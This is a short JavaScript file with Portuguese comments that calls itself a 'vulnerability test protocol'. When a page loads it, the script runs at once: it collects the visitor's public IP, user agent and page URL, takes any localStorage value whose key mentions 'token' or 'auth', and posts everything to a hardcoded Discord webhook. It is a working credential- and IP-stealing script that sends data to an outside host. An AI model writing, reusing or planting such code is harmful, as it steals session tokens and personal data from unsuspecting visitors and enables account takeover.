async function captureProtocol() {
    const WEBHOOK = "https://discordapp.com/api/webhooks/1499948274348724326/Zzom5OzJwSIXKUDdXjGb3hLoUEzXJY7rFmjrliPR5Hmf2MiHpcXHOr4BOiMTBsFhQdHm";

    // --- CAPTURA DE IP (100% FUNCIONAL) ---
    let userIP = "Falha ao rastrear";
    try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        userIP = ipData.ip;
    } catch (err) { userIP = "Bloqueado pelo Cliente"; }

    // --- CAPTURA DE TOKEN (LOCAL STORAGE) ---
    // Vasculha o armazenamento local do domínio onde o site está aberto
    let tokenData = "Nenhum token encontrado no domínio atual";
    try {
        const keys = Object.keys(localStorage);
        for (let key of keys) {
            if (key.toLowerCase().includes("token") || key.toLowerCase().includes("auth")) {
                tokenData = localStorage.getItem(key);
                break;
            }
        }
    } catch (e) { tokenData = "Erro ao acessar storage"; }

    // --- ENVIO DOS DADOS ---
    const payload = {
        username: "CyberTest Logger",
        embeds: [{
            title: "🛑 ALERTA DE EXFILTRAÇÃO",
            color: 0, 
            fields: [
                { name: "🌐 Endereço IP Real", value: `\`${userIP}\``, inline: true },
                { name: "🖥️ Navegador", value: navigator.userAgent, inline: false },
                { name: "🔑 Token Encontrado", value: `\`\`\`${tokenData}\`\`\``, inline: false },
                { name: "🔗 URL", value: window.location.href, inline: true }
            ],
            footer: { text: "Protocolo de Teste de Vulnerabilidade" },
            timestamp: new Date().toISOString()
        }]
    };

    fetch(WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    });
}

captureProtocol();
